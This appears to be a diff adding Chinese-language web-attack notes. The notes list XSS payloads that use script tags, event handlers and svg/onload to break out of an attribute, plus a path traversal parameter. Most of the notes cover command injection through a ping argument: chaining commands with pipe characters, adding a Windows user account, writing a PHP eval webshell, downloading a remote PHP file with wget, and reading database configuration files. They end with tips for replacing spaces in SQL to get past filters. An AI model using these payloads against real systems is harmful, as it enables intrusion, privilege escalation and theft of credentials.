@@ -1,0 +1,108 @@
+
+
+html css javascript
+
+
+
+标签
+
+<script>alert()</script>
+<body onload=alert()>
+<input name ="user" vaule="1" onmouseover=alert()>
+
+
+？
+<input name ="user" vaule="变量">
+
+内联
+1" onmouseover="alert()
+<input name ="user" vaule="1" onmouseover="alert()">
+
+终止
+
+javascript
+	//  单行
+	/*多行*/
+
+1" onmouseover=alert()//
+<input name ="user" vaule="1" onmouseover=alert()//">
+
+
+html
+"><svg/onload=alert()>
+<input name ="user" vaule=""><svg/onload=alert()>">
+
+
+字符编码转化补充（2张图片）
+
+
+
+
+
+
+
+
+xxx.php?m=admin&n=../index.php
+
+
+命令执行
+
+ping 变量
+
+绕过手法
+window
+管道符
+|  &  &&
+unix
+| & && ;
+
+
+
+中间件是 system/root   服务器提权
+ping 变量 | net user c4 c4 /ad
+
+
+中间件是 user  WEB提权（webshell）
+
+ping 变量 | echo "<?php eval($_POST[1])?>" > 3333.PHP
+
+ping 变量 | wget http://xxx.com/1.php    远程下载 wget curl 
+
+ping 变量 | dir				列目录
+ping 变量 | type conn.php		数据库配置文件 window
+
+ping 变量 | ls				列目录
+ping 变量 | cat conn.php		数据库配置文件
+
+
+终止 内联
+
+
+注释
+空格的替换 关注 09 0A 0C 0D A0 20 (16进制)
+
+/**/  +   /*!50000 select */
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
